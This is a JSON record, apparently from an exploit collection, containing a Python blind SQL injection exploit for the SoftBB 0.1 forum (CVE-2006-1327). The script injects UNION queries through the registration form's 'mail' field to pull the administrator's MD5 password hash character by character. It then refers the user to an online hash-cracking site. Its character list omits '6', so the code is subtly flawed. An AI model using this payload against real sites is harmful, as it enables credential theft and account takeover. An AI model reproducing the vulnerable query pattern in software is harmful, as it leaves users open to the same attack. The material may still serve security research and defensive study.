{
  "id": "1594",
  "title": "SoftBB 0.1 - &#039;mail&#039; Blind SQL Injection",
  "cve": "CVE-2006-1327",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/env python\r\n# LOTFREE TEAM 03/2006\r\n# http://lotfree.next-touch.com/\r\n# http://membres.lycos.fr/lotfree/sploits/LOTF-SoftBB.py\r\n#\r\n# Vulnerability info\r\n# Product : SoftBB\r\n# Version : 0.1\r\n#\r\n# The field 'mail' in reg.php is used directly in a SQL query :\r\n# $sql = 'SELECT pseudo,mail FROM '.$prefixtable.'membres WHERE pseudo = \"'.add_gpc($pseudoreg).'\" OR mail = \"'.$mail.'\"';\r\n# We can deduce deduce the result of some sql querys according to the error messages returned\r\n# The exploit test the characters of the md5 hash one by one using a special query\r\nimport httplib, urllib\r\n\r\n# Change the following values...\r\nadmin=\"admin\"\r\nserver=\"localhost\"\r\npath=\"/forum\"\r\n#\r\nhash=\"\"\r\nchars=('a','b','c','d','e','f','1','2','3','4','5','7','8','9','0')\r\n\r\nprint \"LOTFREE TEAM SoftBB BruteForcing tool\"\r\nprint \"-------------------------------------\"\r\nfor i in range(1,33):\r\n  print \"Brute forcing hash[\"+str(i)+\"]\"\r\n  for a in chars:\r\n    params=urllib.urlencode({'pseudo':admin,\r\n    'mdp':'1',\r\n    'mdpc':'1',\r\n    'mail':'\" union select pseudo,1 from softbb_membres where pseudo=\"'+admin+'\" and substr(mdp,'+str(i)+',1)=\"'+a+'\" limit 1,1#',\r\n    'condok':'true'})\r\n    headers = {\"Content-type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/plain\"}\r\n    conn = httplib.HTTPConnection(server)\r\n    conn.request(\"POST\", path+\"/index.php?page=reg\", params, headers)\r\n    response = conn.getresponse()\r\n    data = response.read()\r\n    conn.close()\r\n    if data.find(\"Ce pseudonyme est d\")>0:\r\n      hash=hash+a\r\n      continue\r\n\r\nprint\r\nif len(hash)==32:\r\n  print \"Found hash =\",hash,\"for account\",admin\r\n  print \"You can use http://md5.rednoize.com/ to crack the md5 hash\"\r\nelse:\r\n  print \"Exploit failed... verify the path to the forum or try changing the limit 1,1 in the sql request...\" \r\n\r\n# milw0rm.com [2006-03-19]",
  "url": "https://www.exploit-db.com/exploits/1594"
}